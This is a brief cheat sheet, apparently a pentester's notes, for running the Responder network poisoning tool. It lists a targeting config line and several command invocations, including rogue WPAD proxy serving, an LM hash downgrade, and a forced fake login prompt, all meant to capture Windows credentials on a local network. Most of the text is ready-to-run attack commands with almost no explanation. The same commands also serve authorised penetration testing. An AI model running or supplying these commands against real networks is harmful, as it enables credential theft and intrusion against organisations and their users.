### source
https://github.com/SpiderLabs/Responder  

### start responder for specific ip addresses inside: /etc/responder/Responder.conf - leave empty for all
```
RespondTo = <ip>
```

### analyzse mode (just print do not respond) 
```
python Responder.py -I <interface> -A
```

### default responds to SMB, w = start WPAD proxy server, r = answer netbios wredir, f = fingerprint queries, lm = lm hash downgrade, d = answers netbios domain suffix queries
```
python Responder.py -wrf --lm -v -I <interface>
```

### opens a window to ask for password
```
python ./Responder.py -I <interface> -wfFbv
```

